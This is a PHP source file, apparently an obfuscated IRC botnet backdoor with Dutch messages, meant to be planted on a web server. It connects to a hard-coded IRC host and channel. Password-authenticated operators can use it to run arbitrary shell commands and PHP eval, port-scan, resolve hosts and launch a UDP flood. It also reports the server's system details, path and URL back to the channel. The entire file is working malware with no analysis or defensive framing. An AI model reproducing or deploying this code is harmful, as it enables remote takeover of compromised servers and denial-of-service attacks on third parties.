<?php set_time_limit(0); error_reporting(0);  class rBFRfnzNbVrnVNnfn {

 var $vzzvVfzZjznfrNz = array("FrzNbRvvBZfzjVBZ"=>"abuse.moerenshop.nl",
                     "nBJR"=>"25343",
                     "ZBbjN"=>"scary",
                     "ZBRfZF"=>"13",
                     "PHltD"=>"#wWw#",
                     "RfB"=>"scan",
                     "VZvJjRFZZ"=>"41aa15390e2efa34ac693c3bd7cb8e88",
                     "RNjJrzzjZj"=>".",
                     "bbnnJfNfFRZ"=>"*");
                      var $rzvJbNzBRbJjNbJvRV = array(); 
 function IummqqaqUMm($PD,$Txh)
 {
    $this->amEmuAU("PRIVMSG $PD :$Txh");
 } function amEmuAU($Txh) 
 { 
    fwrite($this->cscCWccgs,"$Txh\r\n"); 
 } function MQiyEEaYAM($PD,$Txh)
 {
    $this->amEmuAU("NOTICE $PD :$Txh");
 } function ymqeEY($PHltD,$RfB=NULL) 
 { 
    $this->amEmuAU("JOIN $PHltD $RfB"); 
 } function AMYeQQAyYiaUyeqa() {
  $dTPxPT = '[abcdefghijklm)nopqrstuvwxyz_ABCDEFGHIJKLM(NOPQRSTUVWXYZ-0123456789]';	
  $HPTPHpp = strlen($dTPxPT);
  for($P=0;$P<$this->vzzvVfzZjznfrNz['ZBRfZF'];$P++) {
	$IYu .= $dTPxPT[rand(0,$HPTPHpp-1)];
  }
  $this->amEmuAU("NICK ".$IYu."");
 } function UqqauaEaM($ldLp) 
 { 
    $this->rzvJbNzBRbJjNbJvRV[$ldLp] = true; 
 } function yEUIyqIIMuyYq() 
 { 
    if(!($this->cscCWccgs = fsockopen($this->vzzvVfzZjznfrNz['FrzNbRvvBZfzjVBZ'],$this->vzzvVfzZjznfrNz['nBJR'],$e,$s,30))) 
    $this->yEUIyqIIMuyYq(); 
    $this->yeeqIAMImeUYyyeQE();
    if(strlen($this->vzzvVfzZjznfrNz['ZBbjN'])>0) 
    $this->amEmuAU("PASS ".$this->vzzvVfzZjznfrNz['ZBbjN']);
    $this->AMYeQQAyYiaUyeqa();
    $this->QUIYaquqEEmaIE();
 }function QUIYaquqEEmaIE() 
 { 
    while(!feof($this->cscCWccgs)) 
    { 
       $this->UeuQq = trim(fgets($this->cscCWccgs,512)); 
       $vvRffbfBfFvnz = explode(" ",$this->UeuQq); 
       if(substr($this->UeuQq,0,6)=="PING :") 
       { 
          $this->amEmuAU("PONG :".substr($this->UeuQq,6)); 
       } 
       if(isset($vvRffbfBfFvnz[1]) && $vvRffbfBfFvnz[1] =="004") 
       { 
          $this->amEmuAU("JOIN ".$this->vzzvVfzZjznfrNz['PHltD']." ".$this->vzzvVfzZjznfrNz['RfB']."");
          $this->ymqeEY($this->vzzvVfzZjznfrNz['PHltD'],$this->vzzvVfzZjznfrNz['RfB']);
          $this->iyIMqUEyQQuYaEemaam();
       } 
       if(isset($vvRffbfBfFvnz[1]) && $vvRffbfBfFvnz[1]=="433") 
       { 
          $this->AMYeQQAyYiaUyeqa(); 
       }
       if($this->UeuQq != $JBz_PLx) 
       { 
          $bFVjRVRZVRVfRf = array(); 
          $Woc = substr(strstr($this->UeuQq," :"),2); 
          $sCKk = explode(" ",$Woc); 
          $ocGCW = explode("!",$vvRffbfBfFvnz[0]); 
          $gSSWsc = explode("@",$ocGCW[1]); 
          $gSSWsc = $gSSWsc[1]; 
          $ocGCW = substr($ocGCW[0],1); 
          $GkKsCgK = $vvRffbfBfFvnz[0]; 
          if($sCKk[0]==$this->ocGCW) 
          { 
           for($P=0;$P<count($sCKk);$P++) 
              $bFVjRVRZVRVfRf[$P] = $sCKk[$P+1]; 
          } 
          else 
          { 
           for($P=0;$P<count($sCKk);$P++) 
              $bFVjRVRZVRVfRf[$P] = $sCKk[$P]; 
          } 
          if(count($vvRffbfBfFvnz)>2) 
          { 
             switch($vvRffbfBfFvnz[1]) 
             { 
                case "QUIT": 
                   if($this->iqQyaumIUqAQ($GkKsCgK)) 
                   { 
                      $this->YeYuQaYe($GkKsCgK); 
                   } 
                break; 
                case "PART": 
                   if($this->iqQyaumIUqAQ($GkKsCgK)) 
                   { 
                      $this->YeYuQaYe($GkKsCgK); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->iqQyaumIUqAQ($GkKsCgK) && (md5($gSSWsc) == $this->vzzvVfzZjznfrNz['bbnnJfNfFRZ'] || $this->vzzvVfzZjznfrNz['bbnnJfNfFRZ'] == "*")) 
                   { 
                      if(substr($bFVjRVRZVRVfRf[0],0,1)==$this->vzzvVfzZjznfrNz['RNjJrzzjZj']) 
                      { 
                         switch(substr($bFVjRVRZVRVfRf[0],1)) 
                         { 
                            case "user": 
                              if(md5($bFVjRVRZVRVfRf[1])==$this->vzzvVfzZjznfrNz['VZvJjRFZZ']) 
                              { 
                                 $this->UqqauaEaM($GkKsCgK);
                              } 
                              else 
                              { 
                                 $this->MQiyEEaYAM($this->vzzvVfzZjznfrNz['PHltD'],"[\002Auth\002]: Fout password $ocGCW idioot!!");
                              } 
                            break; 
                         } 
                      } 
                   }
                   elseif($this->iqQyaumIUqAQ($GkKsCgK)) 
                   { 
                      if(substr($bFVjRVRZVRVfRf[0],0,1)==$this->vzzvVfzZjznfrNz['RNjJrzzjZj']) 
                      { 
                         switch(substr($bFVjRVRZVRVfRf[0],1)) 
                         {                            case "passthru": 
                               $CosoCwcGsgkg = substr(strstr($Woc,$bFVjRVRZVRVfRf[0]),strlen($bFVjRVRZVRVfRf[0])+1); 

                               $ccGKOWWGSoKOc = passthru($CosoCwcGsgkg); 
                               $WskckCScKKKcsg = explode("\n",$ccGKOWWGSoKOc); 
                               for($P=0;$P<count($WskckCScKKKcsg);$P++) 
                                  if($WskckCScKKKcsg[$P]!=NULL) 
                                     $this->IummqqaqUMm($this->vzzvVfzZjznfrNz['PHltD'],"      : ".trim($WskckCScKKKcsg[$P])); 
                            break;                            case "eval":
                              $eval = eval(substr(strstr($Woc,$bFVjRVRZVRVfRf[1]),strlen($bFVjRVRZVRVfRf[1])));
                            break;                            case "udpflood": 
                               if(count($bFVjRVRZVRVfRf)>3) 
                               { 
                                  $this->qEimuyIeqEemAMqmIU($bFVjRVRZVRVfRf[1],$bFVjRVRZVRVfRf[2],$bFVjRVRZVRVfRf[3]); 
                               } 
                            break;                            case "sexec":
                               $CosoCwcGsgkg = substr(strstr($Woc,$bFVjRVRZVRVfRf[0]),strlen($bFVjRVRZVRVfRf[0])+1); 
                               $ccGKOWWGSoKOc = shell_exec($CosoCwcGsgkg); 
                               $WskckCScKKKcsg = explode("\n",$ccGKOWWGSoKOc); 
                               for($P=0;$P<count($WskckCScKKKcsg);$P++) 
                                  if($WskckCScKKKcsg[$P]!=NULL) 
                                     $this->IummqqaqUMm($this->vzzvVfzZjznfrNz['PHltD'],"      : ".trim($WskckCScKKKcsg[$P])); 
                            break;                            case "raw":
                               $this->amEmuAU(strstr($Woc,$bFVjRVRZVRVfRf[1])); 
                            break;                            case "pscan": 
                               if(count($bFVjRVRZVRVfRf) > 2) 
                               { 
                                  if(fsockopen($bFVjRVRZVRVfRf[1],$bFVjRVRZVRVfRf[2],$e,$s,15)) 
                                     $this->IummqqaqUMm($this->vzzvVfzZjznfrNz['PHltD'],"[\002pscan\002]: ".$bFVjRVRZVRVfRf[1].":".$bFVjRVRZVRVfRf[2]." is \2open\2"); 
                                  else 
                                     $this->IummqqaqUMm($this->vzzvVfzZjznfrNz['PHltD'],"[\002pscan\002]: ".$bFVjRVRZVRVfRf[1].":".$bFVjRVRZVRVfRf[2]." is \2closed\2"); 
                               } 
                            break;                            case "die": 
                               $this->amEmuAU("QUIT :die command from $ocGCW");
                               fclose($this->cscCWccgs); 
                               exit;                            case "info":
                               $this->iyIMqUEyQQuYaEemaam();
                            break;                            case "logout": 
                               $this->YeYuQaYe($GkKsCgK); 
                               $this->IummqqaqUMm($this->vzzvVfzZjznfrNz['PHltD'],"[\002Auth\002]\00314 Je bent nu uitgelogt $ocGCW"); 
                            break;                            case "system": 
                               $CosoCwcGsgkg = substr(strstr($Woc,$bFVjRVRZVRVfRf[0]),strlen($bFVjRVRZVRVfRf[0])+1); 
                               $ccGKOWWGSoKOc = system($CosoCwcGsgkg); 
                               $WskckCScKKKcsg = explode("\n",$ccGKOWWGSoKOc); 
                               for($P=0;$P<count($WskckCScKKKcsg);$P++) 
                                  if($WskckCScKKKcsg[$P]!=NULL) 
                                     $this->IummqqaqUMm($this->vzzvVfzZjznfrNz['PHltD'],"      : ".trim($WskckCScKKKcsg[$P])); 
                            break;                            case "rndnick": 
                               $this->AMYeQQAyYiaUyeqa(); 
                            break;                            case "dns": 
                               if(isset($bFVjRVRZVRVfRf[1])) 
                               { 
                                  $KC = explode(".",$bFVjRVRZVRVfRf[1]); 
                                  if(count($KC)==4 && is_numeric($KC[0]) && is_numeric($KC[1]) && is_numeric($KC[2]) && is_numeric($KC[3])) 
                                  { 
                                     $this->IummqqaqUMm($this->vzzvVfzZjznfrNz['PHltD'],"[\002dns\002]: ".$bFVjRVRZVRVfRf[1]." => ".gethostbyaddr($bFVjRVRZVRVfRf[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->IummqqaqUMm($this->vzzvVfzZjznfrNz['PHltD'],"[\002dns\002]: ".$bFVjRVRZVRVfRf[1]." => ".gethostbyname($bFVjRVRZVRVfRf[1])); 
                                  } 
                               } 
                            break;                            case "restart": 
                               $this->amEmuAU("QUIT :gerestart door $ocGCW");
                               fclose($this->cscCWccgs); 
                               $this->yEUIyqIIMuyYq(); 
                            break;                            case "exec": 
                               $CosoCwcGsgkg = substr(strstr($Woc,$bFVjRVRZVRVfRf[0]),strlen($bFVjRVRZVRVfRf[0])+1); 
                               $ccGKOWWGSoKOc = exec($CosoCwcGsgkg); 
                               $WskckCScKKKcsg = explode("\n",$ccGKOWWGSoKOc); 
                               for($P=0;$P<count($WskckCScKKKcsg);$P++) 
                                  if($WskckCScKKKcsg[$P]!=NULL) 
                                     $this->IummqqaqUMm($this->vzzvVfzZjznfrNz['PHltD'],"      : ".trim($WskckCScKKKcsg[$P])); 
                            break;                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $JBz_PLx = $this->UeuQq; 
    } 
    $this->yEUIyqIIMuyYq(); 
 } function iyIMqUEyQQuYaEemaam() {
	if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $PHdDpLThdlD = "\0034ON\003"; } else { $PHdDpLThdlD = "\0039OFF\003"; }

	$tLHxhPHL = php_uname();
	if($tLHxhPHL == "") { $VJwGHp = "\00315---\003"; } else { $VJwGHp = "\00315".$tLHxhPHL."\003"; }
		 
	 $zZGG = "\00315http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\003";
	 
	 $ddwoK =  getcwd()."";
	 
	 $lcSw = "\00315".$ddwoK."\003";

	$KKOwkcwsgo = fileperms("$ddwoK");

	if (($KKOwkcwsgo & 0xC000) == 0xC000) { $OcOGKwWcocK = 's';
	} elseif (($KKOwkcwsgo & 0xA000) == 0xA000) { $OcOGKwWcocK = 'l';
	} elseif (($KKOwkcwsgo & 0x8000) == 0x8000) { $OcOGKwWcocK = '-';
	} elseif (($KKOwkcwsgo & 0x6000) == 0x6000) { $OcOGKwWcocK = 'b';
	} elseif (($KKOwkcwsgo & 0x4000) == 0x4000) { $OcOGKwWcocK = 'd';
	} elseif (($KKOwkcwsgo & 0x2000) == 0x2000) { $OcOGKwWcocK = 'c';
	} elseif (($KKOwkcwsgo & 0x1000) == 0x1000) { $OcOGKwWcocK = 'p';
	} else { $OcOGKwWcocK = 'u'; }

	$OcOGKwWcocK .= (($KKOwkcwsgo & 0x0100) ? 'r' : '-');
	$OcOGKwWcocK .= (($KKOwkcwsgo & 0x0080) ? 'w' : '-');
	$OcOGKwWcocK .= (($KKOwkcwsgo & 0x0040) ?	(($KKOwkcwsgo & 0x0800) ? 's' : 'x' ) :	(($KKOwkcwsgo & 0x0800) ? 'S' : '-'));

	$OcOGKwWcocK .= (($KKOwkcwsgo & 0x0020) ? 'r' : '-');
	$OcOGKwWcocK .= (($KKOwkcwsgo & 0x0010) ? 'w' : '-');
	$OcOGKwWcocK .= (($KKOwkcwsgo & 0x0008) ?	(($KKOwkcwsgo & 0x0400) ? 's' : 'x' ) :	(($KKOwkcwsgo & 0x0400) ? 'S' : '-'));

	$OcOGKwWcocK .= (($KKOwkcwsgo & 0x0004) ? 'r' : '-');
	$OcOGKwWcocK .= (($KKOwkcwsgo & 0x0002) ? 'w' : '-');
	$OcOGKwWcocK .= (($KKOwkcwsgo & 0x0001) ?	(($KKOwkcwsgo & 0x0200) ? 't' : 'x' ) :	(($KKOwkcwsgo & 0x0200) ? 'T' : '-'));
			
	$RfHh = "\00315".$OcOGKwWcocK."\003";

	$this->IummqqaqUMm($this->vzzvVfzZjznfrNz['PHltD'],"\00314[SAFE:\003\002 $PHdDpLThdlD\002\00314]\00315 $zZGG \00314[pwd:]\00315 $lcSw \00314(\003$RfHh\00314) [uname:]\00315 $VJwGHp");
 } function iqQyaumIUqAQ($ldLp) 
 { 
    if(isset($this->rzvJbNzBRbJjNbJvRV[$ldLp])) 
       return 1; 
    else 
       return 0; 
 } function yeeqIAMImeUYyyeQE() {
  $dTPxPT = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';	
  $HPTPHpp = strlen($dTPxPT);
  for($P=0;$P<6;$P++) {
	$IYu .= $dTPxPT[rand(0,$HPTPHpp-1)];
  }
  if(php_uname() == "") { $tLHxhPHL = "---"; } else { $tLHxhPHL = php_uname(); }
  $this->amEmuAU("USER ".$IYu." 127.0.0.1 localhost :".$tLHxhPHL."");
 } function qEimuyIeqEemAMqmIU($ldLp,$XtlPpPXhXl,$AIMu) {
	$this->IummqqaqUMm($this->vzzvVfzZjznfrNz['PHltD'],"[\002UdpFlood Gestart!\002]"); 
	$pxtPxTXpP = "";
	for($P=0;$P<$XtlPpPXhXl;$P++) { $pxtPxTXpP .= chr(mt_rand(1,256)); }
	$XtPtT = time();
	$P = 0;
	while(time()-$XtPtT < $AIMu) {
		$rh=fsockopen("udp://".$ldLp,mt_rand(0,6000),$e,$s,5);
      	fwrite($rh,$pxtPxTXpP);
       	fclose($rh);
		$P++;
	}
	$BCT = $P * $XtlPpPXhXl;
	$BCT = $BCT / 1048576;
	$LFC = $BCT / $AIMu;
	$LFC = round($LFC);
	$BCT = round($BCT);
	$this->IummqqaqUMm($this->vzzvVfzZjznfrNz['PHltD'],"[\002UdpFlood Afgerond!\002]: $BCT MB verzonden / gemiddelde: $LFC MB/s ");
 } function YeYuQaYe($ldLp) 
 { 
    unset($this->rzvJbNzBRbJjNbJvRV[$ldLp]); 
 }}
$wsgCCWCC = new rBFRfnzNbVrnVNnfn;
$wsgCCWCC->yEUIyqIIMuyYq(); ?>